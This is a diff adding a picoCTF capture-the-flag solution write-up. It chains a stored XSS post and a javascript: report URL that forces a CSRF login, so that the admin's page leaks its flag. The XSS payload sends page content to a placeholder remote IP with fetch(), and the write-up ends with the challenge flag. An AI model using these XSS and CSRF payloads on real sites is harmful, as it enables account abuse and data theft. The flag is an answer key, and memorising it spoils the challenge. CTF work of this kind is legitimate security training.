@@ -1,0 +1,45 @@
+** INTERNET BASED SOLUTION **
+
+1) Create a simple test user (username: a, password: a)
+2) Create a new post with the following body:
+
+```
+<script>
+if (window.opener) {
+    script = document.createElement("script")
+    script.innerHTML = "fetch('<YOUR REMOTE IP HERE>/?flag=' + document.body.innerHTML.match(/picoCTF{.*}/))"
+    window.opener.document.body.appendChild(script)
+}
+</script>
+```
+
+3) Submit the following as a report:
+
+```
+javascript:var form = document.createElement("form"); form.setAttribute("method", "POST"); form.setAttribute("action", "http://0.0.0.0:8080/login"); form.setAttribute("target", "Post"); var input = document.createElement("input"); input.name = "username"; input.value = "a"; form.appendChild(input); input = document.createElement("input"); input.name = "password"; input.value = "a"; form.appendChild(input); document.body.appendChild(form); window.open("", "Post"); form.submit(); location = "http://0.0.0.0:8080/"
+
+// Decompressed:
+var form = document.createElement("form");
+form.setAttribute("method", "POST");
+form.setAttribute("action", "http://0.0.0.0:8080/login");
+form.setAttribute("target", "Post");
+
+var input = document.createElement("input");
+input.name = "username";
+input.value = "a";
+form.appendChild(input);
+
+input = document.createElement("input");
+input.name = "password";
+input.value = "a";
+form.appendChild(input);
+
+document.body.appendChild(form);
+window.open("", "Post");
+
+form.submit();
+location = "http://0.0.0.0:8080/"
+```
+
+4) View the flag on your remote machine:
+picoCTF{p00rth0s_parl1ment_0f_p3p3gas_386f0184}
